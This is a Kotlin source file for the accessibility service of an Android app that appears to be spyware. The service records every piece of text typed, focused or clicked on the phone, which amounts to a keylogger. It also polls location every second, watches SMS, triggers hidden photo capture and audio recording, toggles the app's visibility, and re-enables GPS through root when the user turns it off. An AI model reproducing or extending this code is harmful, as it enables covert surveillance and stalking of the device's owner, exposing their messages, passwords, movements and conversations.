package com.github.midros.istheap.services.accessibilityData

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Handler
import android.provider.Telephony
import androidx.core.app.ActivityCompat
import android.view.accessibility.AccessibilityEvent
import com.github.midros.istheap.app.IsTheApp
import com.github.midros.istheap.services.sms.SmsObserver
import com.github.midros.istheap.utils.ConstFun.enableGpsRoot
import com.github.midros.istheap.utils.ConstFun.getDateTime
import com.github.midros.istheap.utils.ConstFun.isRoot
import com.github.midros.istheap.utils.Consts.TAG
import com.pawegio.kandroid.i
import com.pawegio.kandroid.runDelayedOnUiThread
import javax.inject.Inject

/**
 * Created by luis rafael on 17/03/18.
 */
class AccessibilityDataService : AccessibilityService(), LocationListener {

    companion object {
        var isRunningService : Boolean = false
    }

    @Inject lateinit var interactor: InteractorAccessibilityData

    private lateinit var locationManager: LocationManager

    override fun onCreate() {
        super.onCreate()
        IsTheApp.appComponent.inject(this)
        getLocation()
        interactor.getShowOrHideApp()
        interactor.getCapturePicture()
        interactor.getRecordingAudio()
        registerSmsObserver()
    }

    private fun registerSmsObserver() =
            contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI,true, SmsObserver(this,Handler()))

    override fun onInterrupt() {}

    override fun onAccessibilityEvent(event: AccessibilityEvent) {

        when (event.eventType) {

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
                    i(TAG, "${getDateTime()} |(TEXT)| $data")
                }
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(FOCUSED)| $data")
                    i(TAG, "${getDateTime()} |(FOCUSED)| $data")
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(CLICKED)| $data")
                    i(TAG, "${getDateTime()} |(CLICKED)| $data")
                }
            }
        }

    }

    override fun onServiceConnected() {
        isRunningService = true
        interactor.setRunServiceData(true)
        interactor.getSocialStatus()
        interactor.startCountDownTimer()
        super.onServiceConnected()
    }

    override fun onDestroy() {
        isRunningService = false
        interactor.stopCountDownTimer()
        interactor.setRunServiceData(false)
        interactor.clearDisposable()
        super.onDestroy()
    }


    //location
    private fun getLocation() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            interactor.enablePermissionLocation(true)
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 0f, this)
        } else interactor.enablePermissionLocation(false)
    }

    override fun onLocationChanged(location: Location) = interactor.setDataLocation(location)

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

    override fun onProviderEnabled(provider: String) {
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) interactor.enableGps(true)
    }

    override fun onProviderDisabled(provider: String) {
        if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) interactor.enableGps(false)
        runDelayedOnUiThread(3000){ if (isRoot()) enableGpsRoot() }
    }

}